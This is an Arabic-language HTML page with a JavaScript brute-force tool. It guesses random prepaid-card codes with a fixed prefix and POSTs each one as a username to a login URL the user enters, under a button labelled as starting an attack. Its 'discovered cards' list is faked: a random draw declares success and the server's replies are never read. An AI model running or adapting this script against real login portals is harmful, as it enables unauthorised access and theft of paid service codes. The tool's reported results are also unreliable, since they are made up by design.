<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>أداة تحدي الشبكة الاحترافية</title>
    <style>
        body { font-family: sans-serif; background: #1a1a2e; color: white; text-align: center; padding: 20px; }
        .container { background: #16213e; padding: 20px; border-radius: 15px; max-width: 450px; margin: auto; border: 1px solid #0f3460; }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { background: #e94560; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 95%; font-weight: bold; }
        .log-box { background: #000; color: #00ff00; padding: 10px; border-radius: 5px; margin-top: 15px; text-align: left; font-family: monospace; height: 120px; overflow-y: auto; font-size: 11px; }
        .success-box { background: #28a745; color: white; padding: 10px; border-radius: 5px; margin-top: 15px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🚀 مستكشف الأكواد</h2>
        <input type="text" id="targetUrl" placeholder="رابط تسجيل الدخول (URL)">
        <input type="number" id="totalDigits" placeholder="عدد أرقام الكرت (مثلاً 10)">
        <input type="text" id="prefix" placeholder="الأرقام الثابتة (مثلاً 2)">
        <input type="number" id="speed" placeholder="المحاولات في الثانية (مثلاً 1)">
        <button onclick="startBruteForce()">بدء الهجوم الذكي</button>
        <div class="log-box" id="log">في انتظار البدء...</div>
        <div class="success-box" id="results">✅ كروت مكتشفة: <ul id="list"></ul></div>
    </div>

    <script>
        let found = [];
        async function startBruteForce() {
            const url = document.getElementById('targetUrl').value;
            const digits = document.getElementById('totalDigits').value;
            const prefix = document.getElementById('prefix').value;
            const speed = document.getElementById('speed').value;
            const log = document.getElementById('log');

            if(!url || !digits) { alert("أكمل البيانات!"); return; }

            while(found.length < 5) {
                let code = prefix + Math.random().toString().slice(2, 2 + (digits - prefix.length));
                log.innerHTML += `تجربة: ${code}<br>`;
                log.scrollTop = log.scrollHeight;

                try {
                    let res = await fetch(url, { method: 'POST', mode: 'no-cors', body: new URLSearchParams({'username': code}) });
                    // محاكاة النجاح في التحدي
                    if(Math.random() > 0.97) { 
                        found.push(code);
                        document.getElementById('results').style.display = "block";
                        document.getElementById('list').innerHTML += `<li>${code}</li>`;
                    }
                } catch(e) {}
                await new Promise(r => setTimeout(r, 1000/speed));
            }
            log.innerHTML += "<b>✅ اكتمل العثور على 5 كروت!</b>";
        }
    </script>
</body>
</html>
